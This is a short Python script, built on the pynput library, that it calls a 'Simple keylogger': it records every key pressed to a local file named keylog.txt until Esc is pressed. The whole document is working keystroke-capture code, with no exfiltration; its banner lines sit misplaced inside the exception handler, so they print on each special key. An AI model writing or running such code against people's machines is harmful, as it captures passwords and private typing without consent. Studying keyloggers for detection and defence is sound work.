from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    with open(log_file, "a") as file:
        try:
            file.write(key.char)
        except:
            
            file.write(f"[{key}]")
            
            print("==== Simple keylogger ====")
            print("Press 'Esc' to stop.")
            
def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False
    
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()